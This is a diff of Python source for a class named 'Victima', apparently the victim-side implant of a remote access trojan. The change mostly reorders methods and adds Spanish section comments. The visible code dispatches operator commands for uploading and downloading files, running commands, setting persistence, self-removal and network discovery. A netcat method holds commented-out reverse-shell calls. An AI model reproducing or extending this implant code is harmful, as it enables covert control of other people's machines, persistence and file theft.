@@ -121,11 +121,15 @@ class Victima(object):
 				self.detener()
 				break
 
+			# ARCHIVOS	
+
 			elif (datosEleccion=="subir"):
 				self.subir_archivos()
 
 			elif (datosEleccion=="descargar"):
 				self.descargar_archivos()
+
+			# EXTRAS
 
 			elif (datosEleccion=="cmd"):
 				self.cmd()		
@@ -139,8 +143,12 @@ class Victima(object):
 			elif (datosEleccion=="autoremover"):
 				self.autoremover()
 
+			# RED	
+
 			elif (datosEleccion=="ifconfig"):
 				self.ifconfig(plataforma)
+
+			# SISTEMA	
 
 			elif (datosEleccion=="pwd"):
 				self.pwd()
@@ -152,6 +160,7 @@ class Victima(object):
 
 	# -------- MODULOS DE CONTROL --------
 
+	# EXTRAS
 
 	def cmd(self):
 		
@@ -183,6 +192,27 @@ class Victima(object):
 			#print(datos)
 
 		return
+
+	def netcat(self):
+		time.sleep(1.5)
+		#netcat.reverse_shell()
+		#os.system('python3 netcat.py &')
+		return ("Modulo en desarrollo")
+
+
+	def persistencia(self):
+		proceso,msg = persistencia.activar(plataforma)
+		self.enviar(msg)
+		return
+
+
+	def autoremover(self):
+		proceso,msg = autoremover.activar(plataforma)
+		self.enviar(msg)
+		return
+
+
+	# ARCHIVOS	
 
 	def subir_archivos(self):
 
@@ -233,24 +263,7 @@ class Victima(object):
 		return 
 
 
-	def netcat(self):
-		time.sleep(1.5)
-		#netcat.reverse_shell()
-		#os.system('python3 netcat.py &')
-		return ("Modulo en desarrollo")
-
-
-	def persistencia(self):
-		proceso,msg = persistencia.activar(plataforma)
-		self.enviar(msg)
-		return
-
-
-	def autoremover(self):
-		proceso,msg = autoremover.activar(plataforma)
-		self.enviar(msg)
-		return
-
+	# RED	
 
 	def ifconfig(self,plataforma):
 		
@@ -262,6 +275,9 @@ class Victima(object):
 			self.enviar_completo("ip addr")
 
 		return
+
+
+	# SISTEMA	
 
 	def pwd(self):
 
